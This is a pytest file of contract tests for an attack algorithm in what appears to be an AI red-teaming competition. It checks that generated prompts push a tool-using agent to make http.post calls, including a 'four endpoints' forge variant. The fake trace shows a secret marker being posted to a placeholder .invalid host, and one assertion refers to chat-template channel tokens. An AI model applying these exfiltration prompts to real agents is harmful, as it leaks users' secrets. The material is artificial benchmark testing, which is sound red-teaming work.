"""Contract tests for B019 replay-safe tail 0.995."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008R_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B019_ATTACK_PATH = Path("baselines/replaysafe_tail995_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b019_only_extends_replay_safe_tail() -> None:
    b008 = _load_attack(B008R_ATTACK_PATH, "classify5_for_b019")
    b019 = _load_attack(B019_ATTACK_PATH, "tail995_attack")
    assert b008.REPLAY_SAFE_FRAC == 0.99
    assert b019.REPLAY_SAFE_FRAC == 0.995
    assert b019.SLOW_MULTIPOST_N == b008.SLOW_MULTIPOST_N == 4
    assert b019.SPLIT_CLASSIFY_N == b008.SPLIT_CLASSIFY_N == 5
    assert b019.SPLIT_THRESHOLD_S == b008.SPLIT_THRESHOLD_S == 12.0
    assert b019.REPLAY_BUDGET_MULT == b008.REPLAY_BUDGET_MULT == 1.0
    assert b019.PROBE_HOPS == b008.PROBE_HOPS == 0
    assert b019.BURST_K == b008.BURST_K == 1
    assert not hasattr(b019, "FAST_USE_FRAME") or b019.FAST_USE_FRAME is False
    assert b019.TEMPLATE == b008.TEMPLATE
    assert b019.FRAME_TEMPLATE == b008.FRAME_TEMPLATE
    assert b019.PROMPT_TEMPLATES == b008.PROMPT_TEMPLATES


def test_slow_row_keeps_four_endpoint_forge(monkeypatch: pytest.MonkeyPatch) -> None:
    b019 = _load_attack(B019_ATTACK_PATH, "tail995_slow")
    clock = FakeClock()
    monkeypatch.setattr(b019.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)
    candidates = b019.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [candidate.user_messages[0] for candidate in candidates]
    plain = [msg for msg in messages if "Call http.post once" in msg]
    forge = [msg for msg in messages if "these 4 endpoints" in msg]
    assert len(plain) == 5
    assert forge
    assert all(msg.count("http://") == 4 for msg in forge)
    assert all(".invalid" in msg for msg in forge)
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)
    assert set(env.hops) == {8}


def test_fast_row_keeps_plain_single_post(monkeypatch: pytest.MonkeyPatch) -> None:
    b019 = _load_attack(B019_ATTACK_PATH, "tail995_fast")
    clock = FakeClock()
    monkeypatch.setattr(b019.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)
    candidates = b019.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [candidate.user_messages[0] for candidate in candidates]
    assert messages
    assert all("these 4 endpoints" not in msg for msg in messages)
    assert all("<|channel|>analysis" not in msg for msg in messages)
    assert all(".invalid" in msg for msg in messages)
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)


def test_tail995_returns_more_candidates_than_b008r(monkeypatch: pytest.MonkeyPatch) -> None:
    b008 = _load_attack(B008R_ATTACK_PATH, "classify5_tail_compare")
    b019 = _load_attack(B019_ATTACK_PATH, "tail995_count")
    clock_a = FakeClock()
    monkeypatch.setattr(b008.time, "monotonic", clock_a)
    parent = b008.AttackAlgorithm().run(
        FiringEnv(clock_a, latency_s=13.0),
        FakeConfig(time_budget_s=9000.0, max_tool_hops=8),
    )
    clock_b = FakeClock()
    monkeypatch.setattr(b019.time, "monotonic", clock_b)
    child = b019.AttackAlgorithm().run(
        FiringEnv(clock_b, latency_s=13.0),
        FakeConfig(time_budget_s=9000.0, max_tool_hops=8),
    )
    assert len(child) > len(parent)


def test_urls_stay_on_reserved_invalid_hosts() -> None:
    b019 = _load_attack(B019_ATTACK_PATH, "tail995_urls")
    for index in range(20):
        assert b019._url(index).endswith(".invalid")
        message = b019._forge_plan_message(index, b019.SLOW_MULTIPOST_N)
        assert "these 4 endpoints" in message
        assert message.count(".invalid") == 4
        assert ".co" not in message
        assert "example.com" not in message
